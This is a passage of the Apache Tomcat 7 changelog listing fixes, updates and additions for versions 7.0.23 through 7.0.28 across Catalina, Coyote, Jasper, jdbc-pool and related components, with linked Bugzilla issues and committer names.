([r1311844](https://svn.apache.org/viewvc?view=rev&rev=1311844)): JMX enable most pool properties (fhanik) | | --- | --- | | add | [53254](https://bz.apache.org/bugzilla/show_bug.cgi?id=53254) ([r1340160](https://svn.apache.org/viewvc?view=rev&rev=1340160)): Add in the ability to purge connections from the pool (fhanik) | | update | [53367](https://bz.apache.org/bugzilla/show_bug.cgi?id=53367) ([r1346691](https://svn.apache.org/viewvc?view=rev&rev=1346691)): Prevent pool from hanging during database failure (fhanik) | | update | When a connection is reconnected due to failed validation make sure the ConnectionState is reset or it will assume incorrect values (fhanik) | | fix | [53374](https://bz.apache.org/bugzilla/show_bug.cgi?id=53374) ([r1348056](https://svn.apache.org/viewvc?view=rev&rev=1348056)): Add support for the following properties in DataSourceFactory: `commitOnReturn`, `rollbackOnReturn`, `useDisposableConnectionFacade`, `logValidationErrors` and `propagateInterruptState`. Based on patch proposed by Suresh Avadhanula. (kkolinko) | |  | **Other** | | --- | | | update | Update to Eclipse JDT Compiler 3.7.2 at maven tomcat-jasper.pom. (pero) | | --- | --- | | update | Update the native component of the Tomcat APR/native connector to 1.1.24. (markt) | | fix | Add missing dependencies in pom files. (markt) | | add | [53034](https://bz.apache.org/bugzilla/show_bug.cgi?id=53034): Add `project.url` and `project.licenses` sections to the POMs for the Maven artifacts. (markt) | | fix | Properly mention `jsp_2_2.xsd` in the main LICENSE and INSTALLLICENSE files. (kkolinko) | | fix | [53115](https://bz.apache.org/bugzilla/show_bug.cgi?id=53115): Fix using the command "`catalina.bat run`" when the value of `%TEMP%` contains spaces. (kkolinko) | | update | Add dependencies and description to "validate" target in `build.xml`, so that it could be run separately. Improve `BUILDING.txt` and `RUNNING.txt`. (kkolinko) | | | |  | **Tomcat 7.0.27 (markt)** | **released 2012-04-05** | | --- | --- | | | **Catalina** | | --- | | | update | Explicitly ignore empty path values in `virtualClasspath` attribute of `VirtualWebappLoader` class. Document that whitespace around the values is trimmed. Reformat documentation examples to make them more readable. (kkolinko) | | --- | --- | | fix | Further improve fix for [51197](https://bz.apache.org/bugzilla/show_bug.cgi?id=51197) to allow an error reporting Valve to write a response body if `sendError()` is called during an asynchronous request on a container thread. (markt) | | fix | Correct fix for [51741](https://bz.apache.org/bugzilla/show_bug.cgi?id=51741) ([r1307600](https://svn.apache.org/viewvc?view=rev&rev=1307600)): If `VirtualDirContext` class is configured with non-empty value of `extraResourcePaths` option (a feature added in 7.0.24), do not implicitly set `allowLinking` option to the value of `true`. If it is really needed, it should be set explicitly. (kkolinko) | | add | [52500](https://bz.apache.org/bugzilla/show_bug.cgi?id=52500): Added configurable mechanism to retrieve user names from X509 client certificates. Based on a patch provided by Michael Furman. (schultz) | | fix | [52719](https://bz.apache.org/bugzilla/show_bug.cgi?id=52719): Fix a theoretical resource leak in the JAR validation that checks for non-permitted classes in web application JARs. (markt) | | code | Code clean-up identified by [52723](https://bz.apache.org/bugzilla/show_bug.cgi?id=52723), [52724](https://bz.apache.org/bugzilla/show_bug.cgi?id=52724), [52726](https://bz.apache.org/bugzilla/show_bug.cgi?id=52726), [52727](https://bz.apache.org/bugzilla/show_bug.cgi?id=52727), [52729](https://bz.apache.org/bugzilla/show_bug.cgi?id=52729), [52731](https://bz.apache.org/bugzilla/show_bug.cgi?id=52731) and [52732](https://bz.apache.org/bugzilla/show_bug.cgi?id=52732). (markt) | | fix | [52792](https://bz.apache.org/bugzilla/show_bug.cgi?id=52792): Improve error message when a JNDI resource can not be found. (markt) | | fix | [52811](https://bz.apache.org/bugzilla/show_bug.cgi?id=52811): Fix parsing of Content-Type header in `HttpServletResponse.setContentType()`. Introduces a new HTTP header parser that follows RFC2616. (markt/kkolinko) | | fix | [52830](https://bz.apache.org/bugzilla/show_bug.cgi?id=52830): Correct JNDI lookups when using `javax.naming.Name` to identify the resource rather than a `java.lang.String`. (markt) | | fix | [52833](https://bz.apache.org/bugzilla/show_bug.cgi?id=52833): Handle the case where the parent class loader for the Catalina object does not have the system class loader in its hierarchy. This may happen when embedding. Patch provided by olamy. (markt) | | add | [52839](https://bz.apache.org/bugzilla/show_bug.cgi?id=52839): Add a unit test for DigestAuthenticator and SingleSignOn. Patch provide by Brian Burch. (markt) | | fix | [52846](https://bz.apache.org/bugzilla/show_bug.cgi?id=52846): Make sure NonLoginAuthenticator registers not MemoryUser but GenericPrincipal into a session when UserDatabaseRealm is used. (kfujino) | | add | [52850](https://bz.apache.org/bugzilla/show_bug.cgi?id=52850): Extend memory leak prevention and detection code to work with IBM as well as Oracle JVMs. Extend unit tests to check direct and indirect ThreadLocal memory leak detection. Based on a patch provided by Rohit Kelapure. (markt) | | add | Add support for the WebSocket protocol (RFC6455). Both streaming and message based APIs are provided and the implementation currently fully passes the Autobahn test suite. Also included are several examples. A significant contribution to this new functionality was provided by Johno Crawford — particularly the examples. Contributions were also provided by Petr Praus, Jonathan Drake & Slávka. (markt) | | fix | When stopping a Context, ensure that any Servlets registered with JMX are unregistered. (markt) | | code | Make the implementation of `Catalina.getParentClassLoader` consistent with similar methods across the code base and have it return the system class loader if no parent class loader is set. (markt) | | fix | [52953](https://bz.apache.org/bugzilla/show_bug.cgi?id=52953): Ensure users can authenticate when using DIGEST authentication with digested passwords if the digested password is stored using upper case hexadecimal characters since DIGEST authentication expects digests to use lower case characters. Based on a patch provided by Neale Rudd. (markt) | | fix | [52957](https://bz.apache.org/bugzilla/show_bug.cgi?id=52957): Ensure that a Valve implements Lifecycle before calling any Lifecycle methods on that Valve. (markt) | | fix | [52958](https://bz.apache.org/bugzilla/show_bug.cgi?id=52958): Fix MBean descriptors for `org.apache.catalina.realm` package. (markt) | | fix | [52974](https://bz.apache.org/bugzilla/show_bug.cgi?id=52974): Fix `NameNotFoundException` when field/method is annotated with `@Resource` annotation. Patch provided by Violet Agg. (markt) | | add | Add support for multi-thread deployment in UserConfig. (kfujino) | |  | **Coyote** | | --- | | | fix | Correctly register NIO sockets with poller after processing Comet events to ensure that no read events are missed. This fixes an intermittent issue observed in the unit tests. (fhanik/markt) | | --- | --- | | fix | [52770](https://bz.apache.org/bugzilla/show_bug.cgi?id=52770): Fix a bug in the highly unlikely circumstance that an infinite timeout was specified for writing data to a client when using NIO. (markt) | | fix | [52858](https://bz.apache.org/bugzilla/show_bug.cgi?id=52858): Fix high CPU load with SSL, NIO and sendfile when client breaks the connection before reading all the requested data. (markt) | | fix | [52926](https://bz.apache.org/bugzilla/show_bug.cgi?id=52926): Avoid NPE when an NIO Comet connection times out on one thread at the same time as it is closed on another thread. (markt) | | add | Include port number when known in connector name when logging messages from connectors that use automatic free port allocation. (markt) | | fix | Don't try an unlock the acceptor thread if it is not locked. This is unlikely to impact normal usage but it does fix some unit test issues. (markt) | | fix | When using the APR connector ensure that any connections in a keep-alive state are closed when the connector is stopped rather than when the connector is destroyed. This is important when stop() followed by start() is called on the connector. (markt) | |  | **Jasper** | | --- | | | fix | [52725](https://bz.apache.org/bugzilla/show_bug.cgi?id=52725): Use configurable package name for tags rather than hard-coded value so configuration actually works. (markt) | | --- | --- | | code | [52758](https://bz.apache.org/bugzilla/show_bug.cgi?id=52758): Implement additional interface methods in Eclipse JDT integration required for Jasper to correctly with the latest Eclipse development code. (markt) | | fix | [52772](https://bz.apache.org/bugzilla/show_bug.cgi?id=52772): Ensure uriRoot is fully validated before it is used. Patch based on a suggestion by Eugene Chung. (markt) | | fix | [52776](https://bz.apache.org/bugzilla/show_bug.cgi?id=52776): Refactor the code so JspFragment.invoke cleans up after itself. Patch provided by Karl von Randow. (markt) | | fix | [52970](https://bz.apache.org/bugzilla/show_bug.cgi?id=52970): Take account of coercion rules when invoking methods via EL. (markt) | | fix | [52998](https://bz.apache.org/bugzilla/show_bug.cgi?id=52998): Partial fix. Remove static references to the EL expression factory and use per web application references instead. (markt) | | fix | [52998](https://bz.apache.org/bugzilla/show_bug.cgi?id=52998): Remainder of fix. Cache the class to use for the EL expression factory per class loader. (kkolinko) | | fix | [53001](https://bz.apache.org/bugzilla/show_bug.cgi?id=53001): Revert the fix for [46915](https://bz.apache.org/bugzilla/show_bug.cgi?id=46915) since the use case described in the bug is invalid since it breaks the EL specification. (markt) | |  | **Cluster** | | --- | | | fix | Replicate principal in ClusterSingleSignOn. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | [52760](https://bz.apache.org/bugzilla/show_bug.cgi?id=52760): Fix expires filter mime type in javascript examples. (rjung) | | --- | --- | | fix | [52842](https://bz.apache.org/bugzilla/show_bug.cgi?id=52842): Exception in MBeanDumper when dumping MBean for StandardThreadExecutor. (rjung) | | update | Bring built-in mime types for embedded Tomcat more in line with the ones defined in the default web.xml configuration file. (rjung) | | add | Add support to the JMXProxyServlet which is part of the Manager application for fetching a specific key from a `CompositeData` value. Updated documentation, so that the entire 'get' command for the JMX proxy servlet is documented, including the new optional 'key' parameter. (schultz/markt) | |  | **jdbc-pool** | | --- | | | update | Pool cleaner thread should be created using the classloader that loaded the pool, not the context loader (fhanik) | | --- | --- | | fix | [52804](https://bz.apache.org/bugzilla/show_bug.cgi?id=52804): Make pool properties serializable and cloneable. (fhanik) | | fix | [51237](https://bz.apache.org/bugzilla/show_bug.cgi?id=51237) ([r1302902](https://svn.apache.org/viewvc?view=rev&rev=1302902)): Slow Query Report should log using WARN level when queries are slow and within the threshold of caching it. (fhanik) | | fix | [52002](https://bz.apache.org/bugzilla/show_bug.cgi?id=52002) ([r1302948](https://svn.apache.org/viewvc?view=rev&rev=1302948)): Add in configuration option to disallow connection reuse. ([r1305862](https://svn.apache.org/viewvc?view=rev&rev=1305862)): useDisposableConnectionFacade is by default enabled (fhanik) | | fix | [52493](https://bz.apache.org/bugzilla/show_bug.cgi?id=52493) ([r1302969](https://svn.apache.org/viewvc?view=rev&rev=1302969)): Java 7 DataSource method addition. (fhanik) | | fix | [51893](https://bz.apache.org/bugzilla/show_bug.cgi?id=51893) ([r1302990](https://svn.apache.org/viewvc?view=rev&rev=1302990)): Throw an error and notification when pool is exhausted. (fhanik) | | fix | [50860](https://bz.apache.org/bugzilla/show_bug.cgi?id=50860) ([r1303031](https://svn.apache.org/viewvc?view=rev&rev=1303031)): Add in option to configure logging for validation errors. (fhanik) | | fix | [52066](https://bz.apache.org/bugzilla/show_bug.cgi?id=52066) ([r1305931](https://svn.apache.org/viewvc?view=rev&rev=1305931)): Add in configuration option, progagateInterruptState, to allow threads to retain the interrupt state. (fhanik) | |  | **Other** | | --- | | | fix | [52750](https://bz.apache.org/bugzilla/show_bug.cgi?id=52750): Fix the way how daemon.sh parses command options so that more then one can be provided. (mturk) | | --- | --- | | update | Rearrange `validate-eoln` target in `build.xml` so that it could be run ahead of compilation. (kkolinko) | | update | Update Apache Commons Daemon to 1.0.10. (mturk) | | update | Update the native component of the Tomcat APR/native connector to 1.1.23 and take advantage of the simplified distribution. (mturk) | | update | Update to Eclipse JDT Compiler 3.7.2. (markt) | | | |  | **Tomcat 7.0.26 (markt)** | **released 2012-02-21** | | --- | --- | | | **Catalina** | | --- | | | code | Provide constants for commonly used `Charset` objects and use these constants where appropriate. (markt) | | --- | --- | | fix | Refactor the fix for [52184](https://bz.apache.org/bugzilla/show_bug.cgi?id=52184) to correct two issues (a missing class and incorrect class/method names) when using the extras logging packages. (markt) | | fix | [52444](https://bz.apache.org/bugzilla/show_bug.cgi?id=52444): Only load classes during HandlesTypes processing if the class is a match. Previously, every class in the web application was loaded regardless of whether it was a match or not. (markt) | | fix | [52488](https://bz.apache.org/bugzilla/show_bug.cgi?id=52488): Correct typo: exipre -> expire. (markt) | | add | Add a unit test for SSO authentication. Patch provided by Brian Burch. (markt) | | fix | [52511](https://bz.apache.org/bugzilla/show_bug.cgi?id=52511): Correct regression in the fix for [51741](https://bz.apache.org/bugzilla/show_bug.cgi?id=51741) that caused a harmless exception to be logged when scanning for annotations and `WEB-INF/classes` did not exist. (markt) | | code | Refactor to remove a circular dependency between `org.apache.catalina` and `org.apache.naming`. (markt) | | code | Remove some initialisation code from the standard start process (i.e. via the scripts) that was intended for embedding but is not required when performing a standard start.(markt) | | add | Add new method to `MBeanFactory` that allows any Valve to be created and deprecate the methods to create specific Valves. (markt) | | add | Partial sync of MIME type mapping with mime.types from the Apache web server. (rjung) | | fix | [52577](https://bz.apache.org/bugzilla/show_bug.cgi?id=52577): Fix a regression in the fix for [52328](https://bz.apache.org/bugzilla/show_bug.cgi?id=52328). Prevent output truncation when `reset()` is called on a response. (markt) | | fix | [52586](https://bz.apache.org/bugzilla/show_bug.cgi?id=52586): Remove an old and now unnecessary hack that modified the path info reported via the `javax.servlet.forward.path_info` request attribute when forwarding to an error page. (markt) | | fix | [52587](https://bz.apache.org/bugzilla/show_bug.cgi?id=52587): Ensure that if it is necessary to fall back to the default NullRealm, the NullRealm instance is created early enough for it to be correctly initialised. (markt) | | fix | Fix millisecond output in AccessLogValve when using a SimpleDateFormat based time pattern. (rjung) | | fix | [52591](https://bz.apache.org/bugzilla/show_bug.cgi?id=52591): When dumping MBean data, skip attributes where getters throw `UnsupportedOperationException`. (markt) | | fix | [52607](https://bz.apache.org/bugzilla/show_bug.cgi?id=52607): Ensure that the extension validator checks the JARs in the shared and common class loaders for extensions. (markt) | | fix | Correct a threading issue in the generation of the list of standard authenticators during Context initialization that could lead to a web application failing to start if Contexts were started in parallel. (markt) | | fix | [52669](https://bz.apache.org/bugzilla/show_bug.cgi?id=52669): Correct regression that broke annotation processing in `/WEB-INF/classes` for web applications deployed as WARs, packageless classes and some embedding scenarios. The regression was introduced by the invalid assumptions made in the fix for [51741](https://bz.apache.org/bugzilla/show_bug.cgi?id=51741). (markt) | | fix | [52671](https://bz.apache.org/bugzilla/show_bug.cgi?id=52671): When dumping MBean data, skip attributes where getters throw `NullPointerException`. (markt) | |  | **Coyote** | | --- | | | add | [51543](https://bz.apache.org/bugzilla/show_bug.cgi?id=51543): Provide a meaningful error message when writing more response headers than permitted. (markt) | | --- | --- | | fix | [52547](https://bz.apache.org/bugzilla/show_bug.cgi?id=52547): Ensure that bytes written (which is used by the access log) is correctly reset after an HTTP 1.0 request has been processed. (markt) | | code | Minor refactoring to reduce code duplication in the HTTP connectors. (markt) | | fix | [52606](https://bz.apache.org/bugzilla/show_bug.cgi?id=52606): Ensure that POST bodies are available for reply after FORM authentication when using the AJP connectors. (markt) | |  | **Jasper** | | --- | | | fix | [52474](https://bz.apache.org/bugzilla/show_bug.cgi?id=52474): Ensure that leading and trailing white space is removed from listener class names when parsing TLD files. (markt) | | --- | --- | | fix | [52480](https://bz.apache.org/bugzilla/show_bug.cgi?id=52480): When converting class path entries from URLs to files/directories, ensure that any URL encoded characters are converted. Fixes JSP compilation with javac when Tomcat is installed at a path that includes spaces. (markt) | | fix | [52666](https://bz.apache.org/bugzilla/show_bug.cgi?id=52666): Correct coercion order in EL when processing the equality and inequality operators. (markt) | |  | **Web applications** | | --- | | | update | Improve `BUILDING.txt`. Update instructions for building. Add instructions for using Checkstyle and running the tests. (kkolinko) | | --- | --- | | add | [38216](https://bz.apache.org/bugzilla/show_bug.cgi?id=38216): Improve handling of `null` return values in the JMX proxy servlet which is part of the Manager application. (kkolinko) | | fix | [52515](https://bz.apache.org/bugzilla/show_bug.cgi?id=52515): Make it clear in the Realm how-to in the documentation web application that digested password storage when using DIGEST authentication requires that MD5 digests are used. (markt) | | fix | [52634](https://bz.apache.org/bugzilla/show_bug.cgi?id=52634): Fix typos in JSP examples. Patch provided by Felix Schumacher. (rjung) | | fix | [52641](https://bz.apache.org/bugzilla/show_bug.cgi?id=52641): Remove mentioning of ldap.jar from docs. Patch provided by Felix Schumacher. (rjung) | |  | **jdbc-pool** | | --- | | | fix | Fix code style issues and enable Checkstyle checks for jdbc-pool when it is built within Tomcat. (kkolinko) | | --- | --- | | fix | [51582](https://bz.apache.org/bugzilla/show_bug.cgi?id=51582) Correct set and reset the query cache to avoid NPE (fhanik) | |  | **Other** | | --- | | | fix | Update Commons Daemon to 1.0.9 to resolve [52548](https://bz.apache.org/bugzilla/show_bug.cgi?id=52548) which meant that services created with service.bat did not set the `catalina.home` and `catalina.base` system properties. (markt) | | --- | --- | | add | Implement check for correct end-of-line characters in the source files. It is run as separate target in `build.xml`. (kkolinko) | | | |  | **Tomcat 7.0.25 (markt)** | **released 2012-01-21** | | --- | --- | | | **Web applications** | | --- | | | fix | Restore format of the first line of error message for JMX proxy servlet in case scripts were depending on it. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | When building a Windows installer do not copy whole "res" folder to output/dist, but only the files that we need. Apply fixcrlf filter only after the files are copied, so that `INSTALLLICENSE` file had correct line ends. (kkolinko) | | --- | --- | | update | Remove `res/License.rtf`. The file that is actually shown by the Windows installer is `res/INSTALLLICENSE`. (kkolinko) | | add | Automate the OpenPGP signature generation for the release process. (markt) | | fix | Don't exclude directories named target from the build process. (rjung) | | | |  | **Tomcat 7.0.24 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [52184](https://bz.apache.org/bugzilla/show_bug.cgi?id=52184): Provide greater control over the logging of errors triggered by invalid input data (i.e. data over which Tomcat has no control). (markt/kkolinko) | | --- | --- | | fix | [52225](https://bz.apache.org/bugzilla/show_bug.cgi?id=52225): Fix ClassCastException in an Alias added to existing host through JMX. (kkolinko) | | fix | Do not throw IllegalArgumentException from parseParameters() call when chunked POST request is too large, but treat it like an IO error. The `FailedRequestFilter` filter can be used to detect this condition. (kkolinko) | | fix | [52245](https://bz.apache.org/bugzilla/show_bug.cgi?id=52245): Don't allow web applications to package classes from the `javax.el` package. Patch provided by pid. (markt) | | fix | [52259](https://bz.apache.org/bugzilla/show_bug.cgi?id=52259): Fix regression caused by the addition of the threaded component start ([46264](https://bz.apache.org/bugzilla/show_bug.cgi?id=46264)) that triggered a deadlock on startup if no Realm was configured. (markt) | | fix | [52293](https://bz.apache.org/bugzilla/show_bug.cgi?id=52293): Correctly handle the case when `antiResourceLocking` is enabled at the Context level when `unpackWARs` is disabled at the Host level. Based on a patch by Justin Miller. (markt) | | fix | In `ExtendedAccessLogValve` when printing %-encoded value of a parameter, use UTF-8 encoding to convert parameter value to bytes instead of platform default encoding. (markt/kkolinko) | | fix | [52303](https://bz.apache.org/bugzilla/show_bug.cgi?id=52303): Allow web applications that do not have a login configuration to participate in a SSO session. Patch provided by Brian Burch. (markt) | | fix | [52316](https://bz.apache.org/bugzilla/show_bug.cgi?id=52316): When using sendfile, use the number of bytes requested to be written to the response in the access log valve for bytes written rather than recording a value of zero. (markt) | | fix | [52326](https://bz.apache.org/bugzilla/show_bug.cgi?id=52326): Reduce log level for class loading errors during `@HandlesTypes` processing to debug. (markt) | | fix | [52328](https://bz.apache.org/bugzilla/show_bug.cgi?id=52328): Improve performance when large numbers of single characters and/or small strings are written to the response via a Writer. (markt) | | fix | [52384](https://bz.apache.org/bugzilla/show_bug.cgi?id=52384): Do not fail with parameter parsing when debug logging is enabled. (kkolinko) | | fix | Do not flag extra '&' characters in parameters as parse errors. (kkolinko) | | fix | Reduce log level for the message about hitting `maxParameterCount` limit from WARN to INFO. (kkolinko) | | fix | [52387](https://bz.apache.org/bugzilla/show_bug.cgi?id=52387): Ensure that the correct host is used when configuring logging when Tomcat is embedded. Patch provided by David Calavera. (markt) | | update | [52405](https://bz.apache.org/bugzilla/show_bug.cgi?id=52405): Align the Servlet 3.0 implementation with the changes defined in the first maintenance release (also know as Rev. A). See the [JCP documentation](http://jcp.org/aboutJava/communityprocess/maintenance/jsr315/servlet3-mr-reva.html) for a detailed list of changes (markt) | | fix | Improve JMX names for objects related to Connectors that have the address attribute set. (markt) | | fix | Remove some stale attributes from MBeans. (rjung) | | code | Move destruction of `ContainerBase` objects to `ContainerBase` to ensure that they are destroyed. (markt) | | fix | [52443](https://bz.apache.org/bugzilla/show_bug.cgi?id=52443): Change the behaviour of the default Realm in the embedded use case so it is set once on the Engine rather than on every Context thereby avoiding the Lifecycle issues with having the same Realm set on multiple Contexts. (markt) | | add | Provide a new Realm implementation, the NullRealm, that does not contain any users and is used as the default Realm implementation (rather than the JAAS Realm which was used prior to this change) if no Realm is specified. (markt) | | fix | [52461](https://bz.apache.org/bugzilla/show_bug.cgi?id=52461): Don't assume file based URLs when checking last modified times for global and host level web.xml files. Patch provided by violetagg. (markt) | | add | Add test cases for the BASIC and NonLogin Authenticators when not using SSO. Patch provided by Brian Burch. (markt) | |  | **Coyote** | | --- | | | add | [52028](https://bz.apache.org/bugzilla/show_bug.cgi?id=52028): Add support for automatic binding to a free port by a connector if the special value of zero is used for the port. This is mainly useful in embedded and testing scenarios. (markt) | | --- | --- | | update | Remove obsolete `emptySessionPath` JMX attribute. (rjung) | | fix | Correct error in fix for [49683](https://bz.apache.org/bugzilla/show_bug.cgi?id=49683). (markt) | | fix | Ensure that the process of unlocking the acceptor thread does not trigger processing of the connection as if it were a valid request. (markt) | |  | **Jasper** | | --- | | | fix | [52450](https://bz.apache.org/bugzilla/show_bug.cgi?id=52450): Add setter for entityResolver in ParserUtils. This is mainly useful when jasper and dtds are in different class loaders. (mturk) | | --- | --- | | fix | [52321](https://bz.apache.org/bugzilla/show_bug.cgi?id=52321): Ensure that the order of multiple prelude/coda values for JSP pages is respected. (markt) | | fix | [52335](https://bz.apache.org/bugzilla/show_bug.cgi?id=52335): Only handle `<\%` and not `\%` as escaped in template text. (markt) | | fix | [52440](https://bz.apache.org/bugzilla/show_bug.cgi?id=52440): Ensure that when using `ValueExpression.getValueReference()` if the expression is an EL variable that the value returned is the `ValueReference` for the `ValueExpression` associated with the EL variable. (markt) | | fix | [52445](https://bz.apache.org/bugzilla/show_bug.cgi?id=52445): Don't assume that EL method expressions have exactly three components (identifier, method name, parameters). (markt) | |  | **Web applications** | | --- | | | add | [38216](https://bz.apache.org/bugzilla/show_bug.cgi?id=38216): Add the ability to invoke MBean operations to the JMX proxy servlet in the Manager application. Based on a patch by Christopher Hlubek. (markt) | | --- | --- | | update | Further clarify the relation between values used by `RemoteIpValve` and `RemoteIpFilter` and their use by `AccessLogValve`. (kkolinko) | | fix | [52243](https://bz.apache.org/bugzilla/show_bug.cgi?id=52243): Improve windows service documentation to clarify how to include `#` and/or `;` in the value of an environment variable that is passed to the service. (markt) | | fix | [52366](https://bz.apache.org/bugzilla/show_bug.cgi?id=52366): Fix typo in VirtualWebappLoader documentation (configuration example). (rjung) | | update | Replace Bugzilla search link on `ROOT/index.jsp` page with one pointing to the bug reporting page of Tomcat site. (kkolinko) | | update | Move MBean dump code from JMXProxyServlet into a utility class. (rjung) | |  | **Tribes** | | --- | | | fix | [52208](https://bz.apache.org/bugzilla/show_bug.cgi?id=52208): Fix threading issue that may lead to harmless NPE during shutdown that has occasionally been observed when running the unit tests. (markt) | | --- | --- | | fix | [52213](https://bz.apache.org/bugzilla/show_bug.cgi?id=52213), [52354](https://bz.apache.org/bugzilla/show_bug.cgi?id=52354), [52355](https://bz.apache.org/bugzilla/show_bug.cgi?id=52355) and [52356](https://bz.apache.org/bugzilla/show_bug.cgi?id=52356): Fix some potential concurrency issues in `FastQueue`. (markt) | |  | **jdbc-pool** | | --- | | | add | [r1207712](https://svn.apache.org/viewvc?view=rev&rev=1207712): Pool cleaner should be a global thread, not spawn one thread per connection pool. (fhanik) | | --- | --- | |  | **Other** | | --- | | | update | Update Apache Commons Daemon to 1.0.8. (mturk) | | --- | --- | | update | Update Apache Commons Pool to 1.5.7. (kkolinko) | | fix | Fix line ends in `.gitignore` files contained in source distributions. (rjung) | | fix | Run Mapper performance test twice if the first run took too long, to ignore occasional failures. (kkolinko) | | fix | Align `.gitignore` and `build.xml` exclude patterns with `svn:ignore`. (kkolinko) | | fix | Configure `defaultexcludes` for Ant 1.8.1/1.8.2. The `.git` and `.gitignore` patterns are in since Ant 1.8.2, but we include `.gitignore` in src distributions. (kkolinko) | | add | [52237](https://bz.apache.org/bugzilla/show_bug.cgi?id=52237): Allow JUnit logs to be generated in formats other than plain text. Patch provided by M Hasko. (markt/kkolinko) | | fix | Fix build condition for tomcat-dbcp to always rebuild when a new version of commons-pool or commons-dbcp is downloaded. (kkolinko) | | update | Add example of configuration for `SetCharacterEncodingFilter` to the default `web.xml` file. (kkolinko) | | update | Switch unit tests to bind Connectors to localhost rather than all available IP addresses. (markt) | | update | Update to Eclipse JDT Compiler 3.7.1. (markt) | | update | Add Netbeans `nbproject` folder to `svn:ignore` and `.gitignore`. (rjung) | | update | Align `.gitignore` with trunk. (rjung) | | | |  | **Tomcat 7.0.23 (markt)** | **released 2011-11-25** | | --- | --- | | | **Catalina** | | --- | | | add | [46264](https://bz.apache.org/bugzilla/show_bug.cgi?id=46264): Add the ability to start and stop containers (primarily Contexts) using a thread pool rather than a single thread. This can significantly improve start and stop time. Based on patches by Joe Kislo and Felix Schumacher. (markt) | | --- | --- | | fix | [50570](https://bz.apache.org/bugzilla/show_bug.cgi?id=50570): Enable FIPS mode to be set in AprLifecycleListener. Based upon a patch from Chris Beckey. (schultz/kkolinko) | | fix | [51744](https://bz.apache.org/bugzilla/show_bug.cgi?id=51744): Throw the correct exception if an application attempts to modify the associated JNDI context. (markt) | | add | [51744](https://bz.apache.org/bugzilla/show_bug.cgi?id=51744): Add an option to the StandardContext that allows exception throwing when an application attempts to modify the associated JNDI context to be disabled. (markt) | | fix | [51910](https://bz.apache.org/bugzilla/show_bug.cgi?id=51910): Prevent NPE on connector stop if Comet applications are being used without the CometConnectionManagerValve. (markt) | | fix | [51940](https://bz.apache.org/bugzilla/show_bug.cgi?id=51940): Do not limit saving of request bodies during FORM authentication to POST requests since any HTTP method may include a request body. Based on a patch by Nicholas Sushkin. (markt/kkolinko) | | fix | [51956](https://bz.apache.org/bugzilla/show_bug.cgi?id=51956): RemoteAddrFilter used getRemoteHost instead of getRemoteAddr when filtering Comet events. (schultz) | | fix | [51952](https://bz.apache.org/bugzilla/show_bug.cgi?id=51952): Make the inclusion of a response body with a redirect response introduced to address [41718](https://bz.apache.org/bugzilla/show_bug.cgi?id=41718) optional and disabled by default due to the side-effects of including a body with the response in this case. (markt) | | fix | [51972](https://bz.apache.org/bugzilla/show_bug.cgi?id=51972): Correctly handle protocol relative URLs when used with `sendRedirect()`. (markt) | | code | Simplify the deployment code and use full paths in log messages to remove any ambiguity in where a context is being deployed from. (markt) | | fix | [52009](https://bz.apache.org/bugzilla/show_bug.cgi?id=52009): Fix a NPE during access log entry recording when an error occurred during the processing of a Comet request. (markt) | | fix | In `OneLineFormatter` log formatter in JULI always use the US locale to format the date (esp. the month names). (rjung) | | add | Cache the results of parsing the global and host level web.xml files to improve web application start time. (markt) | | fix | [52042](https://bz.apache.org/bugzilla/show_bug.cgi?id=52042): Correct threading issue in annotation caching that could lead to an NPE if multiple threads were processing the same class hierarchy for annotations. (markt) | | fix | Correct additional threading and premature clearance issues with the annotation cache. (markt) | | fix | Correct a regression in the fix for [49779](https://bz.apache.org/bugzilla/show_bug.cgi?id=49779) that parameters POSTed by an unauthenticated user to a page that required FORM authentication were lost during the authentication process. (markt) | | fix | [52055](https://bz.apache.org/bugzilla/show_bug.cgi?id=52055): Ensure that the input and output buffers are correctly reset between keep-alive requests when using Servlet 3.0 asynchronous request processing. (markt) | | fix | Ensure changes to the configuration of the RemoteHostValve and the RemoteAddrValve via JMX are thread-safe. (markt) | | fix | Ensure that the memory leak protection for the HttpClient keep-alive always operates even if the thread has already stopped. (markt) | | code | Remove the Java 1.2 specific error handling around the adding of the shutdown hook. (markt) | | fix | Correct errors in i18n resources and resource usage that meant some messages were either not used or were incorrectly formatted. (markt) | | code | Replace the use of deprecated auth method names from `authenticator.Constants` with the auth method names from `HttpServletRequest`. (kkolinko) | | add | Make configuration issues for security related Valves and Filters result in the failure of the valve or filter rather than just a warning message. (markt) | | add | Improve performance of parameter processing for GET and POST requests. Also add an option to limit the maximum number of parameters processed per request. This defaults to 10000. Excessive parameters are ignored. Note that `FailedRequestFilter` can be used to reject the request if some parameters were ignored. (markt/kkolinko) | | fix | [52091](https://bz.apache.org/bugzilla/show_bug.cgi?id=52091): Address performance issues related to lock contention in StandardWrapper. Patch provided by Taiki Sugawara. (markt) | | code | Switch to using Collections.enumeration() rather than custom code that does the same thing. (markt) | | fix | [52113](https://bz.apache.org/bugzilla/show_bug.cgi?id=52113): Don't assume presence of context.xml file with JMX deployment. (markt) | | update | In `RequestFilterValve` (`RemoteAddrValve`, `RemoteHostValve`): refactor value matching logic into separate method and expose this new method `isAllowed` through JMX. (kkolinko) | | fix | [52156](https://bz.apache.org/bugzilla/show_bug.cgi?id=52156): Ensure that `getServletContext().getResource(path)` returns the correct resource when path contains `/../` sequences or any other sequences that require normalization. (markt) | | add | Report existence of HTTP request parameter parsing errors via new special ServletRequest attribute, `org.apache.catalina.parameter_parse_failed`. (kkolinko) | | add | New filter `FailedRequestFilter` that will reject a request if there were errors during HTTP parameter parsing. (kkolinko) | | update | Improve special attributes handling in Request object by using hash table lookup instead of series of string comparisons. (kkolinko) | | code | Deprecate unused methods in `IntrospectionUtils` class. (kkolinko) | | fix | Improve processing of errors that are wrapped in `InvocationTargetException`. Rethrow fatal errors that must be rethrown. (kkolinko) | | fix | Improve handling of failed web application deployments during automatic deployment. Once deployment of a web application fails in one form (e.g. WAR), no further attempt (e.g. directory) will be made to deploy that web application. The base Lifecycle implementation has been improved to allow failed web applications to be started once the configuration issues have been resolved. Any changes to a context.xml file (global, per host or web application specific) will now result in a redeploy of the affected web application(s) that ensures that any changes are correctly applied rather than a reload which ignores changes in context.xml files. (markt/kkolinko) | | fix | [52173](https://bz.apache.org/bugzilla/show_bug.cgi?id=52173): Improve Javadoc for `delegate` attribute of WebappClassLoader. Based on a patch by bmargulies. (markt) | | add | Add `denyStatus` attribute to `RequestFilterValve` (`RemoteAddrValve`, 